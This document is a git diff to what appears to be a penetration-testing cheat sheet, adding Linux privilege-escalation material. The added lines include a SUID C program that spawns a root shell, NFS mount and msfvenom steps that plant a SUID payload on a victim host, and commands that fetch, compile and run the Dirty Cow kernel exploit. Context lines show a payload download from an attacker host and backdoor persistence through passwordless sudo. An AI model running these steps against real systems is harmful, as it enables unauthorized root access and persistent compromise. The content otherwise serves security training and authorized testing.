@@ -96,6 +96,8 @@ Other great cheetsheets:
   - [6.5. LD_PRELOAD and LD_LIBRARY_PATH](#65-ld_preload-and-ld_library_path)
   - [6.6. SUID binaries](#66-suid-binaries)
   - [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
+  - [6.8. Linux Kernel Exploits](#68-linux-kernel-exploits)
+    - [6.8.1. Dirty Cow Linux Privesc](#681-dirty-cow-linux-privesc)
 - [7. Loot](#7-loot)
   - [7.1. Upgrading to Interactive Shell](#71-upgrading-to-interactive-shell)
   - [7.2. File Transfers](#72-file-transfers)
@@ -131,7 +133,7 @@ Other great cheetsheets:
   - [8.6. Create Windows Backdoor Service](#86-create-windows-backdoor-service)
 - [9. Linux Persistence](#9-linux-persistence)
   - [9.1. Grant passwordless sudo access](#91-grant-passwordless-sudo-access)
-  - [Setting SUID bit](#setting-suid-bit)
+  - [9.2. Setting SUID bit](#92-setting-suid-bit)
 - [10. Pivoting and Redirection](#10-pivoting-and-redirection)
   - [10.1. SSH Tunnels](#101-ssh-tunnels)
   - [10.2. SOCKS Proxies and proxychains](#102-socks-proxies-and-proxychains)
@@ -640,9 +642,10 @@ showmount -e $VICTIM_IP
 # Mounting an exported share:
 # mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
 # use version 2 because it doesn't have any authentication or authorization
+# if mount fails, try without vers=2
 # dir may need "/"prefix
 # dir is one of showmount -e results (from /etc/exports)
-mkdir nfs && sudo mount -t nfs -o vers=2 -o nolock $VICTIM_IP:DIR nfs
+mkdir nfs && sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs
 
 # create user with specific UID to be able to read files on your kali box
 # "-s" login shell, "-M" no create home
@@ -655,6 +658,8 @@ sudo su
 sudo groupadd -g 1010 tempgroup
 sudo usermod -a -G tempgroup tempuser
 ```
+
+See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
 
 ## 3.16. 3306 - MySQL Enumeration
 
@@ -2070,9 +2075,19 @@ the binary in question with your own:
 
 `hijack.c`
 ```c
+/* Gets root shell
+ * Compile (as root):
+ * gcc -Wall pwn.c -o pwn && chmod u+s pwn
+ */
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+
 int main() {
 	setuid(0);
+	setgid(0);
 	system("/bin/bash -p");
+  return 0;
 }
 ```
 
@@ -2115,12 +2130,26 @@ cat /etc/exports
 # On Kali box:
 sudo su   # switch to root
 mkdir /tmp/nfs
-mount -o rw,vers=2 $VICTIM_IP:/share_name /tmp/nfs
+mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
+# Note: if mount fails, try without vers=2 option.
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 chmod +xs /tmp/nfs/shell.elf
 
 # on victim machine
 /tmp/shell.elf
+```
+
+## 6.8. Linux Kernel Exploits
+
+### 6.8.1. Dirty Cow Linux Privesc
+
+[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
+is effective against Linux kernels 2.x through 4.x before 4.8.3.
+
+```sh
+searchsploit -m 40847
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+./dcow -s
 ```
 
 # 7. Loot
@@ -2184,6 +2213,7 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 ### 7.2.4. Mount NFS Share
 
 ```sh
+# try without vers=3 if mount fails. Also try with vers=2
 mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
@@ -2626,7 +2656,7 @@ Edit the `/etc/sudoers` file to have the following line:
 myuser ALL=(ALL) NOPASSWD: ALL
 ```
 
-## Setting SUID bit
+## 9.2. Setting SUID bit
 
 If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
 or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
